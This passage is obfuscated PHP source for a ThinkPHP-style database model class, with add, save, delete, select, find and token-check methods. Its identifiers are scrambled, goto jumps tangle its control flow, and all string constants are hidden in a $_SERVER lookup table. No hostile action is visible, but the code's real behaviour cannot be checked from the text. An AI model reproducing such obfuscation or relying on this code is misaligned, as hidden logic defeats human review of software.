array_unshift($aÄíÌ¨”ºå, $Dªî´ªÆè); return call_user_func_array(array($this, $Câ¸´É”¯´[252]), $aÄíÌ¨”ºå); } else { return call_user_func_array(array(parent, $Dªî´ªÆè), $aÄíÌ¨”ºå); } } protected function call() { goto c¼Ò‡Æ¥²Å; F‘Œ®¹œ¯: if (isset($A±—Î¹µÉƒ[$Fî¤Ô‡ÆÒĞ]) && $A±—Î¹µÉƒ[$Fî¤Ô‡ÆÒĞ] === $D‘Ü«¬‡å) { think_exception(__CLASS__ . $aÂ„ˆÛ…[4] . $D‘Ü«¬‡å . think_lang($aÂ„ˆÛ…[253])); return; } $A±—Î¹µÉƒ[] = $D‘Ü«¬‡å; if (method_exists($this, $aÂ„ˆÛ…[254])) { $c¬Ä™¶Š™ = call_user_func_array(array($this, $aÂ„ˆÛ…[255]), array($dãÑèÚ«Î¦, $A±—Î¹µÉƒ)); if (!is_null($c¬Ä™¶Š™) && $c¬Ä™¶Š™ !== !1) { return $c¬Ä™¶Š™; } } goto BÍÙ‹‚š‰; aìÇ©‘Î¼­: $dãÑèÚ«Î¦ = $D‘Ü«¬‡å; if (is_array($D‘Ü«¬‡å)) { $dãÑèÚ«Î¦ = $D‘Ü«¬‡å[1]; $D‘Ü«¬‡å = $D‘Ü«¬‡å[0]; } $Fî¤Ô‡ÆÒĞ = count($A±—Î¹µÉƒ) - 1; goto F‘Œ®¹œ¯; c¼Ò‡Æ¥²Å: $aÂ„ˆÛ… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A±—Î¹µÉƒ = func_get_args(); $D‘Ü«¬‡å = array_shift($A±—Î¹µÉƒ); goto aìÇ©‘Î¼­; BÍÙ‹‚š‰: $E‘Á¨ò½Æ = call_user_func_array(array($this, $D‘Ü«¬‡å), $A±—Î¹µÉƒ); if (method_exists($this, $aÂ„ˆÛ…[256])) { $c¬Ä™¶Š™ = call_user_func_array(array($this, $aÂ„ˆÛ…[257]), array($dãÑèÚ«Î¦, $A±—Î¹µÉƒ, $E‘Á¨ò½Æ)); if ($c¬Ä™¶Š™) { return $c¬Ä™¶Š™; } } return $E‘Á¨ò½Æ; goto Eô£­Ø’”‡; Eô£­Ø’”‡: } protected function _initialize() { } protected function _facade($a‘Ü‰Ú×¾Í) { $cğé¿İ®Ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!empty($this->fields)) { foreach ($a‘Ü‰Ú×¾Í as $fÁô‡Ïâó¿ => $D»âéÎ¬æğ) { if (!in_array($fÁô‡Ïâó¿, $this->fields, !0)) { unset($a‘Ü‰Ú×¾Í[$fÁô‡Ïâó¿]); } elseif (is_scalar($D»âéÎ¬æğ)) { $this->_parseType($a‘Ü‰Ú×¾Í, $fÁô‡Ïâó¿); } } } if (!empty($this->options[$cğé¿İ®Ò[258]])) { $a‘Ü‰Ú×¾Í = array_map($this->options[$cğé¿İ®Ò[258]], $a‘Ü‰Ú×¾Í); unset($this->options[$cğé¿İ®Ò[258]]); } $this->_beforeWrite($a‘Ü‰Ú×¾Í); return $a‘Ü‰Ú×¾Í; } protected function _beforeWrite(&$E¼ˆ¼¥ğÄ›) { } public function add($BƒÆ„âÒå = '', $f¸ª„œ™ÅÄ = array(), $b¿Üíà¼”Ñ = false) { goto D…éË•âšâ; D…éË•âšâ: if (empty($BƒÆ„âÒå)) { if (!empty($this->data)) { $BƒÆ„âÒå = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[³‘’¼äÑ™ÔÍ][259]); return !1; } } $f¸ª„œ™ÅÄ = $this->_parseOptions($f¸ª„œ™ÅÄ); $BƒÆ„âÒå = $this->_facade($BƒÆ„âÒå); goto C¾ÁéŞ……; C¾ÁéŞ……: if (!1 === $this->_beforeInsert($BƒÆ„âÒå, $f¸ª„œ™ÅÄ)) { return !1; } $f«ç¶—îñĞ = $this->db->insert($BƒÆ„âÒå, $f¸ª„œ™ÅÄ, $b¿Üíà¼”Ñ); if (!1 !== $f«ç¶—îñĞ) { $f‰­¬ÁŸğ = $this->getLastInsID(); if ($f‰­¬ÁŸğ) { $BƒÆ„âÒå[$this->getPk()] = $f‰­¬ÁŸğ; $this->_after_insert($BƒÆ„âÒå, $f¸ª„œ™ÅÄ); return $f‰­¬ÁŸğ; } $this->_after_insert($BƒÆ„âÒå, $f¸ª„œ™ÅÄ); } goto D§¯¼…¸Á; D§¯¼…¸Á: return $f«ç¶—îñĞ; goto cŠÚÄäº•; cŠÚÄäº•: } protected function _beforeInsert(&$eÕ·ë¶˜µÁ, $A¾æ†©½¤Š) { } protected function _after_insert($E‰Ô´˜ê‰, $FĞë“Ó¿é») { } public function addAll($e®¥‡—õ¹, $eÂ†–ÄÕŞ™ = array(), $dßÔ•ó›› = false) { goto FÄ„Õ¶ÔÔÍ; FÃÛÆã±¾¶: return $FŠ´¹›ÕÚ’; goto E–òòò¡ª ; FÄ„Õ¶ÔÔÍ: $CŠİºÊò÷ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($e®¥‡—õ¹)) { $this->error = think_lang($CŠİºÊò÷ù[259]); return !1; } $eÂ†–ÄÕŞ™ = $this->_parseOptions($eÂ†–ÄÕŞ™); goto C¦³‹‚”ÌÌ; C¦³‹‚”ÌÌ: foreach ($e®¥‡—õ¹ as $BˆÛÕ•Ç¤ß => $FÆ˜ÂÀœˆ™) { $e®¥‡—õ¹[$BˆÛÕ•Ç¤ß] = $this->_facade($FÆ˜ÂÀœˆ™); } if (method_exists($this->db, $CŠİºÊò÷ù[260])) { $FŠ´¹›ÕÚ’ = $this->db->insertAll($e®¥‡—õ¹, $eÂ†–ÄÕŞ™, $dßÔ•ó››); } else { $this->startTrans(); foreach ($e®¥‡—õ¹ as $BˆÛÕ•Ç¤ß => $FÆ˜ÂÀœˆ™) { $FŠ´¹›ÕÚ’ = $this->db->insert($FÆ˜ÂÀœˆ™, $eÂ†–ÄÕŞ™, $dßÔ•ó››); } $this->commit(); } if (!1 !== $FŠ´¹›ÕÚ’) { $a‘…©†ÑÄ = $this->getLastInsID(); if ($a‘…©†ÑÄ) { return $a‘…©†ÑÄ; } } goto FÃÛÆã±¾¶; E–òòò¡ª : } public function selectAdd($Fïâ÷Ö²² = '', $B¨Ò«‚ÄÎœ = '', $f×¨¬ÛÓò = array()) { $c–ìàêŠ¥Ş =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f×¨¬ÛÓò = $this->_parseOptions($f×¨¬ÛÓò); if (!1 === ($DÈò‡”ßŞê = $this->db->selectInsert($Fïâ÷Ö²² ? $Fïâ÷Ö²² : $f×¨¬ÛÓò[$c–ìàêŠ¥Ş[261]], $B¨Ò«‚ÄÎœ ? $B¨Ò«‚ÄÎœ : $this->getTableName(), $f×¨¬ÛÓò))) { $this->error = think_lang($c–ìàêŠ¥Ş[262]); return !1; } else { return $DÈò‡”ßŞê; } } public function save($EİâÎÌ¹óÙ = '', $a“÷ÕÎ¸»Ù = array()) { goto fÈ“ØÄ¿Şù; fÈ“ØÄ¿Şù: $BŞ‡èÉµ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($EİâÎÌ¹óÙ)) { if (!empty($this->data)) { $EİâÎÌ¹óÙ = $this->data; $this->data = array(); } else { $this->error = think_lang($BŞ‡èÉµ[259]); return !1; } } $EİâÎÌ¹óÙ = $this->_facade($EİâÎÌ¹óÙ); goto E´Ë‰¬×˜„; E´Ë‰¬×˜„: $a“÷ÕÎ¸»Ù = $this->_parseOptions($a“÷ÕÎ¸»Ù); $BæÙí„…ù = $this->getPk(); if (!isset($a“÷ÕÎ¸»Ù[$BŞ‡èÉµ[263]])) { if (isset($EİâÎÌ¹óÙ[$BæÙí„…ù])) { $C¹ø•Î”ãŞ[$BæÙí„…ù] = $EİâÎÌ¹óÙ[$BæÙí„…ù]; $a“÷ÕÎ¸»Ù[$BŞ‡èÉµ[263]] = $C¹ø•Î”ãŞ; unset($EİâÎÌ¹óÙ[$BæÙí„…ù]); } else { $this->error = think_lang($BŞ‡èÉµ[262]); return !1; } } goto D¹®º©Ú¶; aœ“¿­Í‹: if (!1 !== $bÜè¬¥‡Ä) { if (isset($F½¯Ô„…ë¹)) { $EİâÎÌ¹óÙ[$BæÙí„…ù] = $F½¯Ô„…ë¹; } $this->_afterUpdate($EİâÎÌ¹óÙ, $a“÷ÕÎ¸»Ù); } return $bÜè¬¥‡Ä; goto BÜÊñé½ó; D¹®º©Ú¶: if (is_array($a“÷ÕÎ¸»Ù[$BŞ‡èÉµ[263]]) && isset($a“÷ÕÎ¸»Ù[$BŞ‡èÉµ[263]][$BæÙí„…ù])) { $F½¯Ô„…ë¹ = $a“÷ÕÎ¸»Ù[$BŞ‡èÉµ[263]][$BæÙí„…ù]; } if (!1 === $this->_beforeUpdate($EİâÎÌ¹óÙ, $a“÷ÕÎ¸»Ù)) { return !1; } $bÜè¬¥‡Ä = $this->db->update($EİâÎÌ¹óÙ, $a“÷ÕÎ¸»Ù); goto aœ“¿­Í‹; BÜÊñé½ó: } protected function _beforeUpdate(&$aà˜ÊâÙ‚ô, $fÍŠ»£âÜà) { } protected function _afterUpdate($DŠˆŒŠå‹, $B¿¥…“‘¸•) { } public function delete($CÜ‘†¹ˆ´ = array()) { goto CŠè©¹Œœ„; CŠè©¹Œœ„: $eÀ¢é¦÷ë =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($CÜ‘†¹ˆ´) && empty($this->options[$eÀ¢é¦÷ë[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $e‰Ì²ØÀ² = $this->getPk(); goto eà´¤±öñ²; CÈĞÉ£Æİ‡: $CÑÏï‰®Ã = $this->db->delete($CÜ‘†¹ˆ´); if (!1 !== $CÑÏï‰®Ã) { $FÔŸÑ‚™‡½ = array(); if (isset($E‚¼è“‚®Å)) { $FÔŸÑ‚™‡½[$e‰Ì²ØÀ²] = $E‚¼è“‚®Å; } $this->_after_delete($FÔŸÑ‚™‡½, $CÜ‘†¹ˆ´); } return $CÑÏï‰®Ã; goto AåäÕì¸¿á; eà´¤±öñ²: if (is_numeric($CÜ‘†¹ˆ´) || is_string($CÜ‘†¹ˆ´)) { if (strpos($CÜ‘†¹ˆ´, $eÀ¢é¦÷ë[47])) { $AÌª¶âÖÙ[$e‰Ì²ØÀ²] = array($eÀ¢é¦÷ë[264], $CÜ‘†¹ˆ´); } else { $AÌª¶âÖÙ[$e‰Ì²ØÀ²] = $CÜ‘†¹ˆ´; } $this->options[$eÀ¢é¦÷ë[263]] = $AÌª¶âÖÙ; } $CÜ‘†¹ˆ´ = $this->_parseOptions(); if (is_array($CÜ‘†¹ˆ´[$eÀ¢é¦÷ë[263]]) && isset($CÜ‘†¹ˆ´[$eÀ¢é¦÷ë[263]][$e‰Ì²ØÀ²])) { $E‚¼è“‚®Å = $CÜ‘†¹ˆ´[$eÀ¢é¦÷ë[263]][$e‰Ì²ØÀ²]; } goto CÈĞÉ£Æİ‡; AåäÕì¸¿á: } protected function _after_delete($c“½”éêùÇ, $cİâòŒŒÒ) { } public function select($b¾µ£ÃôŒ‰ = array()) { goto eÁÂ†Í£Ê; eÁÂ†Í£Ê: $eÇ÷‡Çœ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_string($b¾µ£ÃôŒ‰) || is_numeric($b¾µ£ÃôŒ‰)) { $dÏä‡À¦”í = $this->getPk(); if (strpos($b¾µ£ÃôŒ‰, $eÇ÷‡Çœ[47])) { $a…İ›¥éÁ[$dÏä‡À¦”í] = array($eÇ÷‡Çœ[264], $b¾µ£ÃôŒ‰); } else { $a…İ›¥éÁ[$dÏä‡À¦”í] = $b¾µ£ÃôŒ‰; } $this->options[$eÇ÷‡Çœ[263]] = $a…İ›¥éÁ; } elseif (!1 === $b¾µ£ÃôŒ‰) { $b¾µ£ÃôŒ‰ = $this->_parseOptions(); return $eÇ÷‡Çœ[265] . $this->db->buildSelectSql($b¾µ£ÃôŒ‰) . $eÇ÷‡Çœ[266]; } $b¾µ£ÃôŒ‰ = $this->_parseOptions(); goto Añ›¥ä½¼Ÿ; Añ›¥ä½¼Ÿ: $b•§î†šÈØ = $this->db->select($b¾µ£ÃôŒ‰); if (!1 === $b•§î†šÈØ) { return !1; } if (empty($b•§î†šÈØ)) { return null; } goto E‘ßììê˜ø; E‘ßììê˜ø: $this->_afterSelect($b•§î†šÈØ, $b¾µ£ÃôŒ‰); return $b•§î†šÈØ; goto e‡’¤·ßøÃ; e‡’¤·ßøÃ: } protected function _afterSelect(&$C¥–“–î, $b»œ´Û»±ø) { } public function buildSql($f­È¯ÌÈøÌ = array()) { $BŒÒâÛ“ç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f­È¯ÌÈøÌ = $this->_parseOptions($f­È¯ÌÈøÌ); return $BŒÒâÛ“ç[265] . $this->db->buildSelectSql($f­È¯ÌÈøÌ) . $BŒÒâÛ“ç[266]; } public function optionsValue($AÇ¾‹ŞÍ = null) { if (is_null($AÇ¾‹ŞÍ)) { return $this->options; } elseif (is_array($AÇ¾‹ŞÍ)) { $this->options = array_merge($this->options, $AÇ¾‹ŞÍ); } } protected function _parseOptions($d‚ÍÖá‰öá = array()) { goto F·±¡ê–Ÿ°; F·±¡ê–Ÿ°: $CÇ÷˜ÆæÍ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_array($d‚ÍÖá‰öá)) { $d‚ÍÖá‰öá = array_merge($this->options, $d‚ÍÖá‰öá); } $this->options = array(); goto eÈ©‘¼¡“ä; A–ÏÕ¢Ì§õ: if (isset($d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[263]]) && is_array($d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[263]]) && !empty($B¤ÛË‰ÕÇÀ) && !isset($d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[270]]) && !isset($d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[267]])) { foreach ($d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[263]] as $aÙ‚è°÷Å => $CÇ‹øŒêÙ») { $aÙ‚è°÷Å = trim($aÙ‚è°÷Å); if (in_array($aÙ‚è°÷Å, $B¤ÛË‰ÕÇÀ, !0)) { if (is_scalar($CÇ‹øŒêÙ»)) { $this->_parseType($d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[263]], $aÙ‚è°÷Å); } } elseif (!is_numeric($aÙ‚è°÷Å) && $CÇ÷˜ÆæÍ[70] != substr($aÙ‚è°÷Å, 0, 1) && !1 === strpos($aÙ‚è°÷Å, $CÇ÷˜ÆæÍ[91]) && !1 === strpos($aÙ‚è°÷Å, $CÇ÷˜ÆæÍ[248]) && !1 === strpos($aÙ‚è°÷Å, $CÇ÷˜ÆæÍ[271]) && !1 === strpos($aÙ‚è°÷Å, $CÇ÷˜ÆæÍ[272])) { unset($d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[263]][$aÙ‚è°÷Å]); } } } $this->_options_filter($d‚ÍÖá‰öá); return $d‚ÍÖá‰öá; goto eËŞÄê”ÑÓ; eÈ©‘¼¡“ä: if (!isset($d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[267]])) { $d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[267]] = $this->getTableName(); $B¤ÛË‰ÕÇÀ = $this->fields; } else { $B¤ÛË‰ÕÇÀ = $this->getDbFields(); } if (!empty($d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[268]])) { $d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[267]] .= $CÇ÷˜ÆæÍ[50] . $d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[268]]; } $d‚ÍÖá‰öá[$CÇ÷˜ÆæÍ[269]] = $this->name; goto A–ÏÕ¢Ì§õ; eËŞÄê”ÑÓ: } protected function _options_filter(&$B´®Ô¯ƒĞ) { } protected function _parseType(&$b§Â¹æ×º­, $CÆ±õÑŒò) { $e™÷¨Êóšª =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($this->options[$e™÷¨Êóšª[273]][$e™÷¨Êóšª[4] . $CÆ±õÑŒò])) { $c†±÷«½ˆè = strtolower($this->fields[$e™÷¨Êóšª[240]][$CÆ±õÑŒò]); if (!1 !== strpos($c†±÷«½ˆè, $e™÷¨Êóšª[274])) { } elseif (!1 === strpos($c†±÷«½ˆè, $e™÷¨Êóšª[275]) && !1 !== strpos($c†±÷«½ˆè, $e™÷¨Êóšª[276])) { $b§Â¹æ×º­[$CÆ±õÑŒò] = intval($b§Â¹æ×º­[$CÆ±õÑŒò]); } elseif (!1 !== strpos($c†±÷«½ˆè, $e™÷¨Êóšª[277]) || !1 !== strpos($c†±÷«½ˆè, $e™÷¨Êóšª[278])) { $b§Â¹æ×º­[$CÆ±õÑŒò] = floatval($b§Â¹æ×º­[$CÆ±õÑŒò]); } elseif (!1 !== strpos($c†±÷«½ˆè, $e™÷¨Êóšª[279])) { $b§Â¹æ×º­[$CÆ±õÑŒò] = (bool) $b§Â¹æ×º­[$CÆ±õÑŒò]; } } } public function find($eù´›Ô‰½ = array()) { goto aæ˜ô¦ó·³; fˆ¦§„º¢µ: $eù´›Ô‰½ = $this->_parseOptions(); $Dê˜ĞŸÉö = $this->db->select($eù´›Ô‰½); if (!1 === $Dê˜ĞŸÉö) { return !1; } goto E’Ó¦Õ…Ş; D·§â×…: if (!empty($this->options[$f›³½‹Êö»[281]])) { return $this->returnResult($this->data, $this->options[$f›³½‹Êö»[281]]); } return $this->data; goto dñ‰£¬Õƒ–; aæ˜ô¦ó·³: $f›³½‹Êö» =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_numeric($eù´›Ô‰½) || is_string($eù´›Ô‰½)) { $A©¶éäÎö[$this->getPk()] = intval($eù´›Ô‰½); $this->options[$f›³½‹Êö»[263]] = $A©¶éäÎö; } $this->options[$f›³½‹Êö»[280]] = 1; goto fˆ¦§„º¢µ; E’Ó¦Õ…Ş: if (empty($Dê˜ĞŸÉö)) { return null; } $this->data = $Dê˜ĞŸÉö[0]; $this->_afterFind($this->data, $eù´›Ô‰½); goto D·§â×…; dñ‰£¬Õƒ–: } protected function _afterFind(&$E™‚ˆ”× , $Dê˜»£é˜) { } protected function returnResult($C°ßŸµğŠ”, $Cˆ…»¸ = '') { $fóÇäÑÎ„ä =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($Cˆ…»¸) { if (is_callable($Cˆ…»¸)) { return call_user_func($Cˆ…»¸, $C°ßŸµğŠ”); } switch (strtolower($Cˆ…»¸)) { case $fóÇäÑÎ„ä[282]: return json_encode($C°ßŸµğŠ”); case $fóÇäÑÎ„ä[283]: return xml_encode($C°ßŸµğŠ”); } } return $C°ßŸµğŠ”; } public function parseFieldsMap($EÅ—Â÷»ñ, $A¾éÂ¦Æ¸Ë = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Aé•í©š‡ => $F˜ ¾¯ç·…) { if ($A¾éÂ¦Æ¸Ë == 1) { if (isset($EÅ—Â÷»ñ[$F˜ ¾¯ç·…])) { $EÅ—Â÷»ñ[$Aé•í©š‡] = $EÅ—Â÷»ñ[$F˜ ¾¯ç·…]; unset($EÅ—Â÷»ñ[$F˜ ¾¯ç·…]); } } else { if (isset($EÅ—Â÷»ñ[$Aé•í©š‡])) { $EÅ—Â÷»ñ[$F˜ ¾¯ç·…] = $EÅ—Â÷»ñ[$Aé•í©š‡]; unset($EÅ—Â÷»ñ[$Aé•í©š‡]); } } } } return $EÅ—Â÷»ñ; } public function setField($c‹Óœ¾¸…ğ, $fĞ´„Æ…š = '') { if (is_array($c‹Óœ¾¸…ğ)) { $döñÈ—åÔ¶ = $c‹Óœ¾¸…ğ; } else { $döñÈ—åÔ¶[$c‹Óœ¾¸…ğ] = $fĞ´„Æ…š; } return $this->save($döñÈ—åÔ¶); } public function setAdd($CÖœíÏ·á, $dÒ‡¼‚šâæ = 1) { $BÉœ‘ÑªÌù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bŒøÆˆÓ‘ª = $CÖœíÏ·á . $BÉœ‘ÑªÌù[284] . $dÒ‡¼‚šâæ; if ($dÒ‡¼‚šâæ < 0) { $bŒøÆˆÓ‘ª = $CÖœíÏ·á . $dÒ‡¼‚šâæ; } return $this->setField($CÖœíÏ·á, array($BÉœ‘ÑªÌù[285], $bŒøÆˆÓ‘ª)); } public function getField($fº¶¬™¼–Ñ, $c±Š‹éÜÛ¶ = null) { $d¶ÍÁ°¥Ú‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dóè…ªåêÍ[$d¶ÍÁ°¥Ú‰[261]] = $fº¶¬™¼–Ñ; $dóè…ªåêÍ = $this->_parseOptions($dóè…ªåêÍ); $fº¶¬™¼–Ñ = trim($fº¶¬™¼–Ñ); if (strpos($fº¶¬™¼–Ñ, $d¶ÍÁ°¥Ú‰[47])) { if (!isset($dóè…ªåêÍ[$d¶ÍÁ°¥Ú‰[280]])) { $dóè…ªåêÍ[$d¶ÍÁ°¥Ú‰[280]] = is_numeric($c±Š‹éÜÛ¶) ? $c±Š‹éÜÛ¶ : $d¶ÍÁ°¥Ú‰[33]; } $bˆÚŒ‘Í” = $this->db->select($dóè…ªåêÍ); if (!empty($bˆÚŒ‘Í”)) { goto DäÛÀâ±ø’; d³‹®ƒË“İ: $A’÷Í‚ì©Ö = array_shift($fº¶¬™¼–Ñ); $fÅ¦¼´—Î· = array(); $fĞ²˜¼§íõ = count($aĞİœ—‡Îä); goto f‚ï¾å‚±ì; f‚ï¾å‚±ì: foreach ($bˆÚŒ‘Í” as $FïÅÊøì·) { $b¶óæ¤åãœ = $FïÅÊøì·[$D­ø‹˜ğŠ¾]; if (2 == $fĞ²˜¼§íõ) { $fÅ¦¼´—Î·[$b¶óæ¤åãœ] = $FïÅÊøì·[$A’÷Í‚ì©Ö]; } else { $fÅ¦¼´—Î·[$b¶óæ¤åãœ] = is_string($c±Š‹éÜÛ¶) ? implode($c±Š‹éÜÛ¶, $FïÅÊøì·) : $FïÅÊøì·; } } return $fÅ¦¼´—Î·; goto BÒÛˆù¦öÕ; DäÛÀâ±ø’: $aĞİœ—‡Îä = explode($d¶ÍÁ°¥Ú‰[47], $fº¶¬™¼–Ñ); $fº¶¬™¼–Ñ = array_keys($bˆÚŒ‘Í”[0]); $D­ø‹˜ğŠ¾ = array_shift($fº¶¬™¼–Ñ); goto d³‹®ƒË“İ; BÒÛˆù¦öÕ: } } else { if (!0 !== $c±Š‹éÜÛ¶) { $dóè…ªåêÍ[$d¶ÍÁ°¥Ú‰[280]] = is_numeric($c±Š‹éÜÛ¶) ? $c±Š‹éÜÛ¶ : 1; } if ($c±Š‹éÜÛ¶ === $d¶ÍÁ°¥Ú‰[243]) { unset($dóè…ªåêÍ[$d¶ÍÁ°¥Ú‰[280]]); } $FïÅÊøì· = $this->db->select($dóè…ªåêÍ); if (!empty($FïÅÊøì·)) { if ($c±Š‹éÜÛ¶ === $d¶ÍÁ°¥Ú‰[243]) { return reset($FïÅÊøì·[0]); } if (!0 !== $c±Š‹éÜÛ¶ && 1 == $dóè…ªåêÍ[$d¶ÍÁ°¥Ú‰[280]]) { return reset($FïÅÊøì·[0]); } foreach ($FïÅÊøì· as $f·©ƒÃ´ÏØ) { $eÃò›œÃÄ„[] = $f·©ƒÃ´ÏØ[$fº¶¬™¼–Ñ]; } return $eÃò›œÃÄ„; } } return null; } public function create($C»êÔ¾ù¾ç = '', $BËÜŞá™ÍÓ = '') { goto f­Õæê†ä; f³ÜŒ®¹®: $C»êÔ¾ù¾ç = $this->parseFieldsMap($C»êÔ¾ù¾ç, 0); $BËÜŞá™ÍÓ = $BËÜŞá™ÍÓ ? $BËÜŞá™ÍÓ : (!empty($C»êÔ¾ù¾ç[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$D¨Ä‘‰ê©Œ[261]])) { $b·È°Ó„ãó = $this->options[$D¨Ä‘‰ê©Œ[261]]; unset($this->options[$D¨Ä‘‰ê©Œ[261]]); } elseif ($BËÜŞá™ÍÓ == THINK_MODEL_INSERT && isset($this->insertFields)) { $b·È°Ó„ãó = $this->insertFields; } elseif ($BËÜŞá™ÍÓ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $b·È°Ó„ãó = $this->updateFields; } goto FøïÏ×İØå; f­Õæê†ä: $D¨Ä‘‰ê©Œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($C»êÔ¾ù¾ç)) { $C»êÔ¾ù¾ç = $_POST; } elseif (is_object($C»êÔ¾ù¾ç)) { $C»êÔ¾ù¾ç = get_object_vars($C»êÔ¾ù¾ç); } if (empty($C»êÔ¾ù¾ç) || !is_array($C»êÔ¾ù¾ç)) { $this->error = think_lang($D¨Ä‘‰ê©Œ[259]); return !1; } goto f³ÜŒ®¹®; FøïÏ×İØå: if (isset($b·È°Ó„ãó)) { if (is_string($b·È°Ó„ãó)) { $b·È°Ó„ãó = explode($D¨Ä‘‰ê©Œ[47], $b·È°Ó„ãó); } if (think_config($D¨Ä‘‰ê©Œ[286])) { $b·È°Ó„ãó[] = think_config($D¨Ä‘‰ê©Œ[287]); } foreach ($C»êÔ¾ù¾ç as $d‚ÃÎù•¯Õ => $f‚¯¾Í‰‹Ÿ) { if (!in_array($d‚ÃÎù•¯Õ, $b·È°Ó„ãó)) { unset($C»êÔ¾ù¾ç[$d‚ÃÎù•¯Õ]); } } } if (!$this->autoValidation($C»êÔ¾ù¾ç, $BËÜŞá™ÍÓ)) { return !1; } if (!$this->autoCheckToken($C»êÔ¾ù¾ç)) { $this->error = think_lang($D¨Ä‘‰ê©Œ[288]); return !1; } goto cËµÃâõ…ğ; cËµÃâõ…ğ: if ($this->autoCheckFields) { $b·È°Ó„ãó = $this->getDbFields(); foreach ($C»êÔ¾ù¾ç as $d‚ÃÎù•¯Õ => $f‚¯¾Í‰‹Ÿ) { if (!in_array($d‚ÃÎù•¯Õ, $b·È°Ó„ãó)) { unset($C»êÔ¾ù¾ç[$d‚ÃÎù•¯Õ]); } elseif (MAGIC_QUOTES_GPC && is_string($f‚¯¾Í‰‹Ÿ)) { $C»êÔ¾ù¾ç[$d‚ÃÎù•¯Õ] = stripslashes($f‚¯¾Í‰‹Ÿ); } } } $this->autoOperation($C»êÔ¾ù¾ç, $BËÜŞá™ÍÓ); $this->data = $C»êÔ¾ù¾ç; goto fñï‰Ş½—ï; fñï‰Ş½—ï: return $C»êÔ¾ù¾ç; goto fëæ…¯Ë›å; fëæ…¯Ë›å: } public function autoCheckToken($f‡¼«Ã•Ä¶) { $d—Ü’Ôñ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset($this->options[$d—Ü’Ôñ[289]]) && !$this->options[$d—Ü’Ôñ[289]]) { return !0; } if (think_config($d—Ü’Ôñ[286])) { $Dñã¥İäß‰ = think_config($d—Ü’Ôñ[287]); if (!isset($f‡¼«Ã•Ä¶[$Dñã¥İäß‰]) || Session::get($Dñã¥İäß‰)) { return !1; } list($fĞÁ¾‘‚Ø, $bÚ¹Æ²™) = explode($d—Ü’Ôñ[70], $f‡¼«Ã•Ä¶[$Dñã¥İäß‰]); if ($bÚ¹Æ²™ && Session::get($Dñã¥İäß‰ . $d—Ü’Ôñ[91] . $fĞÁ¾‘‚Ø) === $bÚ¹Æ²™) { Session::remove($Dñã¥İäß‰ . $d—Ü’Ôñ[91] . $fĞÁ¾‘‚Ø); return !0; } if (think_config($d—Ü’Ôñ[290])) { Session::remove($Dñã¥İäß‰ . $d—Ü’Ôñ[91] . $fĞÁ¾‘‚Ø); } return !1; } return !0; } public function regex($c»ªêÄÙ…Å, $aå×²ÃäÉƒ) { $aÂß±ÏÙğ» =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fêõªÑ®³ = array($aÂß±ÏÙğ»[291] => $aÂß±ÏÙğ»[292], $aÂß±ÏÙğ»[293] => $aÂß±ÏÙğ»[294], $aÂß±ÏÙğ»[295] => $aÂß±ÏÙğ»[296], $aÂß±ÏÙğ»[297] => $aÂß±ÏÙğ»[298], $aÂß±ÏÙğ»[299] => $aÂß±ÏÙğ»[300], $aÂß±ÏÙğ»[301] => $aÂß±ÏÙğ»[302], $aÂß±ÏÙğ»[303] => $aÂß±ÏÙğ»[304], $aÂß±ÏÙğ»[278] => $aÂß±ÏÙğ»[305], $aÂß±ÏÙğ»[306] => $aÂß±ÏÙğ»[307]); if (isset($fêõªÑ®³[strtolower($aå×²ÃäÉƒ)])) { $aå×²ÃäÉƒ = $fêõªÑ®³[strtolower($aå×²ÃäÉƒ)]; } return preg_match($aå×²ÃäÉƒ, $c»ªêÄÙ…Å) === 1; } private function autoOperation(&$bàšÌ²ÃøÚ, $B²©íè¸ÃÁ) { $bÕø’ÀÉç =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!empty($this->options[$bÕø’ÀÉç[308]])) { $A¦ğğÚ•›‹ = $this->options[$bÕø’ÀÉç[308]]; unset($this->options[$bÕø’ÀÉç[308]]); } elseif (!empty($this->_auto)) { $A¦ğğÚ•›‹ = $this->_auto; } if (isset($A¦ğğÚ•›‹)) { foreach ($A¦ğğÚ•›‹ as $A®—¯Àçà´) { if (empty($A®—¯Àçà´[2])) { $A®—¯Àçà´[2] = THINK_MODEL_INSERT; } if ($B²©íè¸ÃÁ == $A®—¯Àçà´[2] || $A®—¯Àçà´[2] == THINK_MODEL_BOTH) { switch (trim($A®—¯Àçà´[3])) { case $bÕø’ÀÉç[309]: case $bÕø’ÀÉç[310]: $fÔ»ïêô˜ø = isset($A®—¯Àçà´[4]) ? (array) $A®—¯Àçà´[4] : array(); if (isset($bàšÌ²ÃøÚ[$A®—¯Àçà´[0]])) { 